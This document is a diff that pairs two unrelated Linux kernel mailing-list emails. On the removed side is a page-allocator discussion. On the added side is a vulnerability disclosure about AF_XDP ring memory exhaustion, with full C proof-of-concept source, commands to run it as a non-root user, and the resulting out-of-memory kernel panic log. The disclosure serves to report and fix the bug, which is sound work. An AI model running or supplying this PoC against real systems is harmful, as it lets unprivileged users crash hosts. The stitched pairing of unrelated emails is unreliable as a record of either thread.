@@ -1,89 +1,81 @@
-Received: from mail-pg1-f180.google.com (mail-pg1-f180.google.com [209.85.215.180])
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E03914A33FA
-	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 14:27:22 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.180
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8D172453A42
+	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 14:36:28 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785335244; cv=none; b=gyUD7XX0MczLLwYooSz8CfcFvgn3b7f716aSqeJx0MqV9j689OH0jwvpNALE7rvmdNQMo8XT6/oWHrExrm6mUzoA1cuGf0AZkEo3ZuOwPSpMJWeskVt3AY1sqXGqXsnMohLuNip+jwiOH5EMF9aAbXl27Qi3TAyVoC8R6qpvXUc=
+	t=1785335790; cv=none; b=XL7Q5msNA3uL4GPumI29lnpjwHy0J17oKjSLwkT1e2FZoN0KitTxrmMXMqI8FJPXKp53v+bQp+O4AR3SxAuDJD/RGi5ZZCCzM/tPFeW2ZsuvUK8M413DkIQLYB8GmMFZDXgFGuy/Hhg2oFF316Jrf3zKbiB/njD0mSHQTaki4j8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785335244; c=relaxed/simple;
-	bh=cSK35UhxS7x2Pk7Yv73KpzJYQwmuRBZT31oI2qSxdOY=;
-	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version; b=rwStewzvC5sp02EDNGLUhQ7ZEISuzpxmiv8abArp+f1e5LwRuMLEj1Sehey2x5YwfNlrtu3iTJcZUTYSl+MJINvT/KhjNzPsPoItyeS2GpS+VmKJUhVLkJx49y1/jRc8xgfOpzGZWyhtqAFHR5YrxRRfWSUxbG0dHWwTVl0xgi4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=hR9bu6Yk; arc=none smtp.client-ip=209.85.215.180
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
+	s=arc-20240116; t=1785335790; c=relaxed/simple;
+	bh=MQAuXV+YSe6wY+OeQNkJs4ByOs6oR8kAYEiwtIhrnZc=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=HKvWAfMJmEfYqRWNYyMuG2jxZS2oXREWo+u/d0W08yueonWWr4pfgQ6CJg1W0VHyHF1tKfH0ghvEcOyE+/RIClkGZ564cjvZwGjreknF30gEEh08GbDPwLYaHESRdmxZa3yoVUcUxmhSw6nMhYijC0+Tm3IoWI3hm25cD9dfSG4=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=ER3If8Hx; arc=none smtp.client-ip=209.85.210.174
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="hR9bu6Yk"
-Received: by mail-pg1-f180.google.com with SMTP id 41be03b00d2f7-c9aea40d799so559230a12.0
-        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 07:27:22 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="ER3If8Hx"
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-8487088510aso1047858b3a.0
+        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 07:36:28 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1785335242; x=1785940042; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=q6TvvO09U4zGaQilxr2NjN4uQvkcCnEQhswilI8Rgyw=;
-        b=hR9bu6YkOs2POj9OD+w8IgvI7z2zyItta7j1vHJpRuwgOdyDNjmkaG2WURuspgumYf
-         72SKDTsmhQdnzIQR1BQnuNNT+sCx8++Fkx+uIqQORZzOIkYstI9TGrIuLFFpcSDyKg7/
-         IiTdfnTZ8lYGKBzsYxNo7sHaTgBSw1LqX7DY57l8ODx8SDqbQZS9usxTQfBBLWR8+cM0
-         w80z5e0IwpBpi4oLbkdkkL5bYwol6MG236SztZSTG8UFOPd4f3PUF9m12tebOw43crxg
-         yQuz0DU3U1QLtMCKwyEijDuyzJhTDM7faSOTkt5Ovk31UHQsilRIwKdWbCxFnr87qlBW
-         O6Fw==
+        d=nebusec.ai; s=google; t=1785335788; x=1785940588; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=lAYG26xXTtp1lxXHz5vkKZEx04PRa/Wu6D3zYtw5kq0=;
+        b=ER3If8Hx1Z5HkaxJlaoxUm4OEK7XyCE9ujneSQ1dVtnc/oxewc9dDccap3B7tFj15V
+         EaquKsaaioEZhZh3h+qxVrsCYyYIy3JVNMIu4jfQp6eVAKSB5idVXShVkLIY5mJFD3la
+         FHhZR47UzqLCfARgeiGFN3OpNj291sPUDbzehfD6ozDLwAjP4SjCpp+BxQ+6Hk2YVwMN
+         bpMdQ67B/Xm1s6p2RnWB0Hp/qT6wYvmc3GXpEmdFtd4oepPB5C/LpyXhSH0kqT532a3N
+         dpjkVanZ8RcpiNSbNzsDEV/dFZ5SzIUfvrDXjkGfLOj8EAsFQcO7ikBEQxGuEcsFNcHd
+         HYyA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785335242; x=1785940042;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to:content-type;
-        bh=q6TvvO09U4zGaQilxr2NjN4uQvkcCnEQhswilI8Rgyw=;
-        b=DltuBbKEpoEL9PP+Him2ES3GicabgvZ8123psV6YwWTu0XqM5wiiEyqEdTzG6+9xVm
-         x53J/YaHw3Yfsgc03AFBxeQeFRLdPGTafC7ZKeXIm3/BWSgqMPOr53lCUGkuAsfPbdw9
-         6G31BYEcu/c/vUIzK5fIxIFR7WCC5KHXWUftXiPDUtME72AyoQUIFjgzeMTXU8BnVa3g
-         sOkxDQvF1pJLVxNgynWCRy7BizdV3Kl16iE4xeNcO8zXl2vh3ggAPGyfNNxFKT51P/vR
-         bgoKXGEzSBI6E/M9d2WoQOIetm1qAlrxQD2Nk6E/pLzgUcqsjupA/sMg+tGeW5AnRl7F
-         bqrg==
-X-Forwarded-Encrypted: i=1; AHgh+RqGYdixpNnT0GEhCAsKA3b4H6B76zXQepi67j5um7+Q792y5R1hlCc4GTa9X575Bs5x3HyzAzI=@vger.kernel.org
-X-Gm-Message-State: AOJu0YxUCXGDom4+bWBxrNvl4G9jnc3y751ETCrGwz06Asr2PR2v31CW
-	XeRIwbIKKCceUnEUTEW0ZEZ0iprQJr4JpBWH3rpKqERl/2Pf4LhzoQ0f
-X-Gm-Gg: AR+sD12w/4ASa8UVUngMkIHz6wdhgb1gya35zGhVYE5aEyUEL0kaFhDitsqboNiRphS
-	HRLeAEhTdVWtO3wSfJKjN8O2ZVC4va6EliK+tder7jvwuYhd2k+oF43m9k52oxzPfo+2uIZpbec
-	uu5jlJd2qeAS/y2HyQlt1h7YgPrYsToRH+RikSqKifUI8gCA6HiyWmtaUH7u1SqMhojsFMu4KLA
-	AOiqfYhhC7QbJpxXRe+UP/rpXQF5EHbIlqKfISZ7//BAzLGq/jqN5bq3xyxHYu+xTOBeLhaq9Q+
-	N9Q0IhN26AcV1tXC4yEdLcidGTRwF0Bxf8fzsnuozb0jjcyPhEyyOOdT5zRKsqdJxg+yp5z6QS+
-	gC039+mhQyxc23MnR96M//01AP36oWzdh1cZdKSBnv9i1J4jJ8H9Ngiihiuatsw+QeABVPVO/4Y
-	lIigi4qlMbUInVS2AkX0AEIpBon2HGGxQZgVO/qD1HdpfK1A==
-X-Received: by 2002:a05:6a21:490:b0:3bf:e66f:266a with SMTP id adf61e73a8af0-3c8ba61c214mr8223820637.59.1785335241938;
-        Wed, 29 Jul 2026 07:27:21 -0700 (PDT)
-Received: from ubuntu.. ([2a09:bac1:76a0:1a98::48c:10])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31504cc63f3sm9690326eec.16.2026.07.29.07.27.16
+        d=1e100.net; s=20251104; t=1785335788; x=1785940588;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=lAYG26xXTtp1lxXHz5vkKZEx04PRa/Wu6D3zYtw5kq0=;
+        b=X6LpXgeOyykxegOoi5EigXPO4cqiIFH2D/2vLRFFQuRIKwpaS7Qavi/L17B+tpSZhR
+         FuDB7V4FXp/pQMpeztPbtN/HPjBbcwwJMOqEk9k4GEK/uWBfmMNmrQ+zP2wp2wuUa0Of
+         R+f5CBEVCH7Vlh5e8WmmpoQS057GdhpCc41eqb2V8YX8LtgJEe2YLD87aJ1D9lR+zmkh
+         VMI7/EIB6kboAEMiFeSz7QFEJPshCZpRKQHbx8aIApZAwjk0omF1nXO3vQ8AAiO/DTnv
+         VJzpQEHPmcxuJ1ePOR1frcFcraHjWJPNWdzHqOk5qKRV8F06EKxZQR6u5LBvEsbwk77R
+         QkxA==
+X-Gm-Message-State: AOJu0YwzWH0CMbCXnCyXVrvweNFQGjBUkcHJ5zF449OvRPr1KHk6jGQ7
+	6rjTwdw7Ighpt9MP+HsHmFuJiygUCgEayV7DoCtC3kaGG9AesvrxoNYyCAOMuvOZbJPTsHWFkCY
+	fjJplniT1
+X-Gm-Gg: AR+sD12woXr6eAHGt3fpH6cI1lzgle/2APwXHRcS6Camp0+s/JLKk7zN6GekfaMJOY0
+	lD8gsk7VKE8nQKdw/o7pmfwcb8tXlA3GZaENdpgro9MqMj/U8Q/tNkkbGRmzk9+9l0tfl6baGoQ
+	HRUx9ciyd+8axePlEooGcBI1hWi/LIn1A59Yb68lGYXKav+dluOdK3jmCLOyCY9yC+wXSs6gJAs
+	Isb+XBPgd57cVeazL8hesyM5v+IH29Gqew/8v8dNzpS6yw22kYu41qAnIi+VlHQfckrjOvCxOJV
+	DSLhrtgjZEjNloxjw2WR3WCSyc4GIASNOXZhAMnSTKzkfZSLwVYj7qnb1/UHvnnfgqWQkrIJKo8
+	dZLEAzyDqAlDPwhHnbLwnE8Wp82bYpCOK/ImE7g4/cgWsM0CMWuApNV0MRi1J98VAX1wPyg1U1a
+	vQQDk4r8SE8BiYNVviWUkSuoG/JJeKWhP2PIN8IBpK0pO2QH6Ly28VWQre2Xwq7zcvdRY7z/w=
+X-Received: by 2002:a05:6a00:4502:b0:84a:2e5f:d697 with SMTP id d2e1a72fcca58-84e9327418amr7327889b3a.33.1785335787705;
+        Wed, 29 Jul 2026 07:36:27 -0700 (PDT)
+Received: from localhost.localdomain ([115.192.250.185])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84ea02f8473sm1498306b3a.31.2026.07.29.07.36.21
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 29 Jul 2026 07:27:21 -0700 (PDT)
-From: Jing Wu <realwujing@gmail.com>
-To: Vlastimil Babka <vbabka@kernel.org>,
-	Andrew Morton <akpm@linux-foundation.org>
-Cc: Qiliang Yuan <realwujing@gmail.com>,
-	David Hildenbrand <david@kernel.org>,
-	Lorenzo Stoakes <lorenzo.stoakes@oracle.com>,
-	"Liam R. Howlett" <Liam.Howlett@oracle.com>,
-	Mike Rapoport <rppt@kernel.org>,
-	Suren Baghdasaryan <surenb@google.com>,
-	Michal Hocko <mhocko@suse.com>,
-	Axel Rasmussen <axelrasmussen@google.com>,
-	Yuanchu Xie <yuanchu@google.com>,
-	Wei Xu <weixugc@google.com>,
-	Brendan Jackman <jackmanb@google.com>,
-	Johannes Weiner <hannes@cmpxchg.org>,
-	Zi Yan <ziy@nvidia.com>,
-	Lance Yang <lance.yang@linux.dev>,
-	SeongJae Park <sj@kernel.org>,
-	Matthew Wilcox <willy@infradead.org>,
-	netdev@vger.kernel.org
-Subject: Re: [PATCH v11] mm/page_alloc: boost watermarks on atomic allocation failure
-Date: Wed, 29 Jul 2026 22:27:12 +0800
-Message-ID: <20260729142712.1568604-1-realwujing@gmail.com>
-X-Mailer: git-send-email 2.43.0
-In-Reply-To: <6ddc5919-f001-43ad-8101-d118ad70593f@kernel.org>
-References: <20260720-feat-mm-page_alloc-v11-v11-1-7376b02c27b3@gmail.com> <20260720163719.cf37f6be63bfd88a06965761@linux-foundation.org> <90ac10ff-55f8-4f07-8e1d-bb9f3a8cc546@kernel.org> <20260729131701.3354724-1-realwujing@gmail.com> <6ddc5919-f001-43ad-8101-d118ad70593f@kernel.org>
+        Wed, 29 Jul 2026 07:36:27 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org,
+	bpf@vger.kernel.org
+Cc: magnus.karlsson@intel.com,
+	maciej.fijalkowski@intel.com,
+	sdf@fomichev.me,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	hawk@kernel.org,
+	john.fastabend@gmail.com,
+	vega@nebusec.ai,
+	zihanx@nebusec.ai
+Subject: [PATCH net 0/1] xsk: prevent AF_XDP ring resource exhaustion
+Date: Wed, 29 Jul 2026 14:35:55 +0000
+Message-ID: <cover.1785313094.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -92,87 +84,269 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-From: Qiliang Yuan <realwujing@gmail.com>
+Hi Linux kernel maintainers,
 
-On 7/29/26 16:00, Vlastimil Babka (SUSE) wrote:
-> GFP_KERNEL can't really come up short in practice, at least for non-costly
-> orders, which are considered "too small to fail". I don't see immediately
-> what order is being allocated there.
-> It might perhaps be looping inside the allocator without success if it has
-> trouble reclaiming. Which usually means the userspace workload is
-> overloading the system.
+We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
+non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Good catch, and it made me go check: the mergeable-buffer path allocates
-through get_a_page() -> alloc_page(gfp_mask), so it's order-0. You're
-right that this shouldn't return outright failure - "still_empty" from
-try_fill_recv(GFP_KERNEL) looping via HZ/2 reschedules was my framing,
-not something I've confirmed against an actual trace. What we have is
-an outcome-level observation: buffers run short and incoming packets
-have nowhere to land during that window. I don't have instrumentation
-that distinguishes "GFP_KERNEL returned failure" from "GFP_KERNEL took
-a long time looping in reclaim before succeeding" - I shouldn't have
-implied the former without checking, and I'll stop describing it that
-way.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-> So is it looping in the page allocator or returning failures with
-> GFP_KERNEL? I guess the former otherwise there would be allocation warnings.
-> Note that why this happens can be also 4.19-specific and not applicable
-> today.
+---- details below ----
 
-Agreed it's probably the former, for the reason you gave.
+Bug details:
 
-> If kswapd can save the day by being woken up earlier, then it doesn't
-> sound like there's nothing to reclaim. But then it's puzzling me why the
-> GFP_KERNEL attempts wouldn't work smoothly enough too.
+AF_XDP sockets allow user space to allocate RX, TX, UMEM fill and UMEM
+completion rings with setsockopt().  xskq_create() only validates that the
+entry count is non-zero and a power of two before computing the ring size and
+calling vmalloc_user().  The allocation is not charged against the socket
+optmem limit.  The underlying root cause dates back to the original shared
+xskq_create() helper used for UMEM fill rings, while later RX-ring support and
+the vmalloc-based ring allocation path only made the same bug easier to reach
+and more effective at pinning memory before bind or packet I/O.
 
-I think this is right that kswapd isn't reclaiming anything a direct
-reclaimer couldn't also reach - it's the same underlying mechanism, not
-a separate capability. What the patch changes is timing: kswapd, once
-boosted and woken, keeps working toward a higher target continuously in
-the background, instead of each CPU handling its own RX queue only
-doing reclaim reactively, synchronously, at the moment its own
-allocation needs it. Under concurrent pressure across multiple queues
-(which is the case in what we've seen - several CPUs hitting this at
-once), that front-loaded, single-threaded reclaim may finish work that
-would otherwise be duplicated or contended across multiple simultaneous
-direct reclaimers. I'll say plainly this is a hypothesis about why the
-timing helps, not something I've measured directly yet.
+The fix charges the page-aligned ring size to sk_omem_alloc before the
+vmalloc_user() call and bounds the charge by the namespace optmem limit.  The
+charge path uses an atomic cmpxchg loop, rather than adding first and rolling
+back later, so concurrent allocations cannot race past the limit and the
+signed sk_omem_alloc counter cannot overflow and wrap below the limit.
 
-> Great, especially with a realistic workload. However I'd still worry that
-> we're working around some old and long time fixed allocator deficiency
-> from 4.19, unless it's demonstrated on mainline.
+UMEM fill and completion queues can move from the socket to the AF_XDP buffer
+pool and be destroyed after socket release.  The queue therefore keeps a
+socket reference for safe uncharging.  To avoid a release cycle where the
+queue reference prevents the socket destructor that used to release the pool,
+the socket now drops its pool and UMEM references from xsk_release() before
+the final socket put; xsk_destruct() keeps the same helper as a fallback.
 
-That's a fair worry, and it made me go check exactly what our 4.19 host
-does and doesn't have, rather than treat it as a monolithic 2018
-allocator. Two relevant mm fixes landed upstream since:
+This reproducer does not use packetdrill because the trigger is the AF_XDP
+setsockopt() ring allocation path, not a packet sequence or protocol state
+transition that packetdrill can express.
 
-- c89cca307b20 ("net: skbuff: sprinkle more __GFP_NOWARN on ingress
-  allocs", 2024-08) - suppresses the warn_alloc() print for this exact
-  path. Our host does NOT have this backported, which is exactly why
-  the 144 failures showed up as log lines at all.
+Reproducer:
 
-- 281dd25c1a018 ("mm/page_alloc: let GFP_ATOMIC order-0 allocs access
-  highatomic reserves", 2024-10) - lets ALLOC_NON_BLOCK (i.e. GFP_ATOMIC)
-  order-0 requests fall back to the MIGRATE_HIGHATOMIC reserve, the same
-  way ALLOC_OOM already could. This one you suggested and reviewed
-  yourself. Our host DOES have this one backported.
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
 
-So the 144 failures we cited were logged on a kernel that already had
-your highatomic fallback fix in place - it's not the "already fixed
-elsewhere" case for that specific mechanism. What it demonstrates is
-that under sustained pressure, the (small, bounded) highatomic reserve
-itself can still run out, at which point GFP_ATOMIC order-0 has nowhere
-left to fall back to on the current attempt - which is exactly the
-point where this patch's proactive kswapd boost would matter, since it
-only ever helps subsequent attempts, never the one that's already
-failing.
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
 
-I can't make the same claim about the rest of page_alloc.c/reclaim -
-there have been ~900 commits to that file since v4.19, and I'm not
-going to pretend our host tracks all of them. But for the two fixes
-that are specifically relevant to this failure mode, I now know
-exactly which one we have and which one we don't, instead of guessing.
-I'll still go reproduce this on current mainline rather than rest the
-case on that host alone.
+------BEGIN poc.c------
+#define _GNU_SOURCE
+#include <errno.h>
+#include <linux/if_xdp.h>
+#include <netinet/in.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/sysinfo.h>
+#include <unistd.h>
 
-Qiliang
+static void print_meminfo(const char *tag)
+{
+	struct sysinfo info;
+
+	if (sysinfo(&info) == 0) {
+		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
+		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
+		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;
+
+		fprintf(stderr,
+			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
+			tag, total >> 20, free >> 20, avail >> 20);
+	}
+}
+
+static int set_ring(int fd, int optname, unsigned int entries, const char *name)
+{
+	int ret;
+
+	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
+	if (ret) {
+		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
+			name, entries, strerror(errno));
+		return -1;
+	}
+
+	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
+		name, entries, fd);
+	return 0;
+}
+
+int main(int argc, char **argv)
+{
+	static const struct {
+		int optname;
+		const char *name;
+	} rings[] = {
+		{ XDP_RX_RING, "XDP_RX_RING" },
+		{ XDP_TX_RING, "XDP_TX_RING" },
+		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
+		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
+	};
+	unsigned int entries = 1U << 25;
+	int nsockets = 8;
+	int *fds;
+	int i, j;
+
+	if (argc > 1)
+		entries = strtoul(argv[1], NULL, 0);
+	if (argc > 2)
+		nsockets = atoi(argv[2]);
+	if (!entries || !nsockets) {
+		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
+			argv[0]);
+		return 1;
+	}
+
+	fds = calloc(nsockets, sizeof(*fds));
+	if (!fds) {
+		perror("calloc");
+		return 1;
+	}
+
+	fprintf(stderr,
+		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
+		entries, nsockets, getpid());
+	print_meminfo("before");
+
+	for (i = 0; i < nsockets; i++) {
+		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
+		if (fds[i] < 0) {
+			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
+				i, strerror(errno));
+			break;
+		}
+
+		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
+		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
+			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
+				goto out;
+			print_meminfo(rings[j].name);
+		}
+	}
+
+out:
+	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
+	sleep(600);
+
+	for (i = 0; i < nsockets; i++) {
+		if (fds[i] >= 0)
+			close(fds[i]);
+	}
+	free(fds);
+	return 0;
+}
+------END poc.c--------
+
+----BEGIN crash log----
+[  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
+[  112.548314][  T953] CPU: 2 UID: 1028 PID: 953 Comm: poc Not tainted 6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
+[  112.549150][  T953] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  112.550090][  T953] Call Trace:
+[  112.550346][  T953]  <TASK>
+[  112.550569][  T953]  panic (kernel/panic.c:1101)
+[  112.550876][  T953]  ? __pfx_panic (include/linux/nmi.h:163)
+[  112.551222][  T953]  ? __pfx_lock_release+0x10/0x10
+[  112.551642][  T953]  out_of_memory (mm/oom_kill.c:1193)
+[  112.552013][  T953]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800
+[  112.552538][  T953]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
+[  112.552919][  T953]  ? __pfx_mutex_trylock (kernel/locking/mutex.c:582 (discriminator 1))
+[  112.553335][  T953]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
+[  112.553854][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.554295][  T953]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
+[  112.554819][  T953]  ? local_clock_noinstr (kernel/sched/clock.c:307 (discriminator 1))
+[  112.555214][  T953]  ? lock_release+0x687/0xc90
+[  112.555584][  T953]  ? __pfx___might_resched+0x10/0x10
+[  112.556006][  T953]  __alloc_pages_noprof (mm/page_alloc.c:5221 (discriminator 1))
+[  112.556409][  T953]  ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4967)
+[  112.556860][  T953]  alloc_pages_mpol_noprof+0x1b1/0x430
+[  112.557289][  T953]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
+[  112.557759][  T953]  ? __pfx___might_resched+0x10/0x10
+[  112.558179][  T953]  __vmalloc_node_range_noprof (include/linux/workqueue.h:699 include/linux/workqueue.h:760 mm/vmalloc.c:3801 mm/vmalloc.c:3941 mm/vmalloc.c:4082)
+[  112.558628][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.558990][  T953]  ? __pfx___vmalloc_node_range_noprof (mm/vmalloc.c:4143 (discriminator 2))
+[  112.559508][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.559950][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.560346][  T953]  vmalloc_user_noprof (mm/vmalloc.c:4484 (discriminator 4))
+[  112.560731][  T953]  ? xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.561096][  T953]  xskq_create (include/linux/refcount.h:291 include/linux/refcount.h:366 include/linux/refcount.h:383 include/net/sock.h:839 net/xdp/xsk_queue.c:61)
+[  112.561434][  T953]  xsk_setsockopt (net/xdp/xsk.c:1198)
+[  112.561799][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.562227][  T953]  ? aa_sk_perm+0x131/0x8a0
+[  112.562573][  T953]  ? __pfx_xsk_setsockopt (include/linux/refcount.h:461)
+[  112.562975][  T953]  ? security_file_permission (security/security.c:2424 (discriminator 18))
+[  112.563420][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.563850][  T953]  ? vfs_write (fs/read_write.c:799)
+[  112.564222][  T953]  do_sock_setsockopt (net/socket.c:395)
+[  112.564610][  T953]  ? __pfx_do_sock_setsockopt (net/socket.c:282 (discriminator 1))
+[  112.565046][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.565490][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.565926][  T953]  ? __do_sys_sysinfo (kernel/sys.c:2202)
+[  112.566333][  T953]  ? __pfx___do_sys_sysinfo (kernel/sys.c:3073)
+[  112.566758][  T953]  __sys_setsockopt (net/socket.c:2396)
+[  112.567144][  T953]  __x64_sys_setsockopt (arch/x86/include/asm/compat.h:94 (discriminator 1) arch/x86/include/asm/compat.h:100 (discriminator 1) net/socket.c:2505 (discriminator 1))
+[  112.567538][  T953]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
+[  112.567967][  T953]  ? trace_hardirqs_on+0x5b/0x110
+[  112.568366][  T953]  do_syscall_64 (arch/x86/include/asm/entry-common.h:43 (discriminator 3) include/linux/irq-entry-common.h:100 (discriminator 3) include/linux/entry-common.h:174 (discriminator 3) arch/x86/entry/syscall_64.c:89 (discriminator 3))
+[  112.568721][  T953]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[  112.569187][  T953] RIP: 0033:0x7e2b01ae42ba
+[  112.569541][  T953] Code: 48 83 ec 10 48 63 c9 48 63 ff 45 89 c9 6a 2c e8 fc d3 f7 ff 48 83 c4 18 c3 0f 1f 80 00 00 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 8b 15 21 2b 0d 00 f7
+All code
+========
+   0:	48 83 ec 10          	sub    $0x10,%rsp
+   4:	48 63 c9             	movslq %ecx,%rcx
+   7:	48 63 ff             	movslq %edi,%rdi
+   a:	45 89 c9             	mov    %r9d,%r9d
+   d:	6a 2c                	push   $0x2c
+   f:	e8 fc d3 f7 ff       	call   0xfffffffffff7d410
+  14:	48 83 c4 18          	add    $0x18,%rsp
+  18:	c3                   	ret
+  19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+  20:	49 89 ca             	mov    %rcx,%r10
+  23:	b8 36 00 00 00       	mov    $0x36,%eax
+  28:	0f 05                	syscall
+  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
+  30:	77 06                	ja     0x38
+  32:	c3                   	ret
+  33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
+  38:	48 8b 15 21 2b 0d 00 	mov    0xd2b21(%rip),%rdx        # 0xd2b60
+  3f:	f7                   	.byte 0xf7
+
+Code starting with the faulting instruction
+===========================================
+   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
+   6:	77 06                	ja     0xe
+   8:	c3                   	ret
+   9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
